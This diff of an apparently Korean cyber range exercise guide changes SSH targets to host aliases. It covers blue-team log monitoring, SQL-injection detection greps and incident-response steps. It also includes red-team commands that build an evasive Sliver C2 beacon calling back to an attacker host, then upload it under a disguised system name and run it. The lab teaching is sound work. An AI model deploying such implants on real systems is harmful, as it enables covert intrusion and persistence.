@@ -329,13 +329,13 @@ curl -s -X POST http://localhost:9100/projects/$PROJECT_R1/execute-plan \
       },
       {
         "order": 2,
-        "instruction_prompt": "echo \"=== [R1-DEF] 방화벽 현황 ===\"; ssh ccc@10.20.30.1 \"nft list ruleset 2>/dev/null | head -30 || echo nftables 미설정\"",
+        "instruction_prompt": "echo \"=== [R1-DEF] 방화벽 현황 ===\"; ssh 6v6-fw \"nft list ruleset 2>/dev/null | head -30 || echo nftables 미설정\"",
         "risk_level": "low",
         "subagent_url": "http://10.20.30.201:8002"
       },
       {
         "order": 3,
-        "instruction_prompt": "echo \"=== [R1-DEF] 로그 모니터링 시작 ===\"; echo \"[Suricata]\"; ssh ccc@10.20.30.1 \"tail -5 /var/log/suricata/fast.log 2>/dev/null || echo No alerts\"; echo \"[Wazuh]\"; ssh ccc@10.20.30.100 \"tail -10 /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 || echo No alerts\"",
+        "instruction_prompt": "echo \"=== [R1-DEF] 로그 모니터링 시작 ===\"; echo \"[Suricata]\"; ssh 6v6-fw \"tail -5 /var/log/suricata/fast.log 2>/dev/null || echo No alerts\"; echo \"[Wazuh]\"; ssh 6v6-siem \"tail -10 /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 || echo No alerts\"",
         "risk_level": "low",
         "subagent_url": "http://10.20.30.201:8002"
       }
@@ -421,7 +421,7 @@ curl -s -X POST http://localhost:9100/projects/$PROJECT_R2/execute-plan \
     "tasks": [
       {
         "order": 1,
-        "instruction_prompt": "echo \"=== [R2-DEF] 공격 탐지 확인 ===\"; ssh ccc@10.20.30.80 \"tail -30 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|or 1=1|script\\\" | wc -l\" 2>/dev/null; echo \"건의 공격 시도 탐지\"; echo \"[점수] 공격 탐지: +50점/건\"",
+        "instruction_prompt": "echo \"=== [R2-DEF] 공격 탐지 확인 ===\"; ssh 6v6-web \"tail -30 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|or 1=1|script\\\" | wc -l\" 2>/dev/null; echo \"건의 공격 시도 탐지\"; echo \"[점수] 공격 탐지: +50점/건\"",
         "risk_level": "low",
         "subagent_url": "http://10.20.30.201:8002"
       },
@@ -472,7 +472,7 @@ curl -s -X POST http://localhost:9100/projects/$PROJECT_R2/execute-plan \
       },
       {
         "order": 2,
-        "instruction_prompt": "echo \"=== [관전] 공격 이벤트 타임라인 ===\"; ssh ccc@10.20.30.80 \"tail -100 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|script|alert|or 1=1|passwd\\\" | awk '{print \\$4, \\$7}' | tail -10 || echo No attack events\"",
+        "instruction_prompt": "echo \"=== [관전] 공격 이벤트 타임라인 ===\"; ssh 6v6-web \"tail -100 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|script|alert|or 1=1|passwd\\\" | awk '{print \\$4, \\$7}' | tail -10 || echo No attack events\"",
         "risk_level": "low",
         "subagent_url": "http://10.20.30.201:8002"
       }
@@ -714,7 +714,7 @@ sliver > generate beacon --mtls 10.20.30.202:443 --evasion --save /tmp/sliver-be
 
 # Implant 업로드 + 실행
 scp /tmp/sliver-beacon ccc@10.20.30.80:/tmp/.systemd-helper
-ssh ccc@10.20.30.80 "/tmp/.systemd-helper &"
+ssh 6v6-web "/tmp/.systemd-helper &"
 
 # === Phase 4: Privilege Escalation (10분) ===
 sliver > use 1
@@ -783,11 +783,11 @@ sudo cscli decisions list | head -10
 
 # === 수동 IR ===
 # 1. 침해 호스트 격리
-ssh ccc@10.20.30.1
+ssh 6v6-fw
 sudo nft add element inet filter blocked '{ 10.20.30.202 }'
 
 # 2. 침해 host 의 evidence 수집
-ssh ccc@10.20.30.80
+ssh 6v6-web
 sudo netstat -tlnp                                      # 의심 connection
 sudo ps auxf | head                                     # 의심 process
 sudo crontab -l                                         # cron persistence
